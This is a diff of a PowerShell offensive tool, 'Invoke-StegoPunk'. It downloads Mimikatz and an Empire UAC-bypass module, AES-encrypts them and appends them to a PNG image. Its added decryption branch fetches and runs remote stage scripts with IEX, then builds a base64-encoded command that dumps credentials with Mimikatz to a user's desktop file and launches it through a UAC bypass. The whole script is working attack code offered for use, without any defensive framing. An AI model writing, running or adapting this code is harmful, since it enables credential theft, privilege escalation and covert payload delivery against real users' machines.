@@ -1,26 +1,26 @@
-Param (
-             [string]$Mode = "$null",
-             [Parameter(Mandatory=$True)]
-            [string]$Fileurl = "$null",
-             [Parameter(Mandatory=$True)]
-            [string]$ImageUrl = "$null",
-            [Parameter(Mandatory=$True)]
-            [string]$ImagepathName = "$null"
-       )
-
 function Invoke-StegoPunk {
-                  
-     
-      if ($Mode -eq "encryption")
+          Param (
+            [ValidateSet(“encryption”,”decryption”)] 
+            [string]$Mode,
+            [string]$Fileurl,
+            [string]$ImageUrl,
+            [string]$ImageName = "$null"
+                )  
+#invoke-stegopunk -mode encryption -fileurl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1' -imageurl 'http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png' -imagename 'mix.png'                  
+       if ($Mode -eq "encryption")
           {
           write-host "Encryption Mode" 
           $request = New-Object System.Net.WebCLient
           $proxy = New-Object System.Net.webproxy
           $request.proxy = $proxy
           $request.usedefaultcredentials = "true";
+          write-host "Download First Stage File"
           $inputstring = $request.DownloadString($fileurl)
-          $Imagepath = "$ENV:temp\qwerty.png"
+          #$Imagepath = "$ENV:temp\qwerty.png"
+          write-host "Download PNG "
+          $Imagepathname = "$env:userprofile\desktop\" + "$ImageName"
           $request.Downloadfile("$ImageUrl",$Imagepathname)
+          write-host "Encrypting First Stage File ..."
           $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
           $AES = New-Object System.Security.Cryptography.AesManaged
           $Passphrase="Passo"
@@ -44,9 +44,10 @@ function Invoke-StegoPunk {
           $MemoryStream.Close()
           $AES.Clear()
           $mio = [system.Convert]::ToBase64String($Encrypted)
-
+            write-host "Download UAC Stage File"
           $b_url = 'https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1'
-
+            write-host "Encrypting UAC Module ..."
+          
           $inputstring = $request.DownloadString($b_url)
           $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
           $AES = New-Object System.Security.Cryptography.AesManaged
@@ -73,20 +74,25 @@ function Invoke-StegoPunk {
           $mio2 = [system.Convert]::ToBase64String($Encrypted)
 
           $mio = "wootwoot" + $mio + "weetweet" + $mio2
-
-          Add-Content "$percorso" $mio
+            write-host "Creating PNG "
+          Add-Content "$ImagepathName" $mio
           } 
         else
           {
-           if ($Mode -eq "decryption")
-               {
-                write-host "Decryption Mode" 
-               }
-              else
-               {
-                write-host "hdhdhdhdhhdhahahahahahah"
-               }
-               
+            $stage2 = New-Object System.Net.WebCLient
+            $proxy = New-Object System.Net.webproxy
+            $stage2.proxy = $proxy
+            $stage2.usedefaultcredentials = "true"
+            IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES2Stage.ps1')
+            $base2 = Invoke-AES2Stage
+            iex ($base2)
+            $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage; iex ($base1); invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
+            $ubytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+            $encodedcmd = [Convert]::ToBase64String($ubytes) 
+            write-Host `n$encodedcmd
+            
+            invoke-bypassuac -command "Powershell.exe -EncodedCommand $encodedcmd"
           }
          
 }
+
